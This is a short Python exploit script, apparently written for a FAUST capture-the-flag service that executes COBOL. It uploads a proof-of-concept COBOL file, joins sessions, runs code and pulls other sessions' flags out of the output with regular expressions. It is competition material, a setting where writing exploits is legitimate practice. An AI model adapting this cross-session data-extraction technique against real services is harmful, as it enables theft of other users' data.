#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

from api import Endpoint
from base64 import b32decode, b64encode

import sys
if len(sys.argv) > 1:
    url = sys.argv[1]
else:
    url = 'http://localhost:5000'

e = Endpoint(url)

c = e.fetch_cookie()
with open('poc.cob') as f:
    code = f.read()

print(c)
n = e.upload_string(code)

e.join(*range(n))
contents = [x.split('STOP RUN.') for x in e.run(0).strip().split(":")]

import re

found = []
for sessions in contents:
    for x in sessions:
        a = re.search('05 FLGBASE32A PIC X\(32\) VALUE "(.*)"', x)
        b = re.search('05 FLGBASE32B PIC X\(8\) VALUE "(.*)"', x)
        if a is not None and b is not None:
            found.append('FAUST_{}'.format(b64encode(b32decode(a.group(1) + b.group(1))).decode('ascii')))

for i in found:
    print(i)
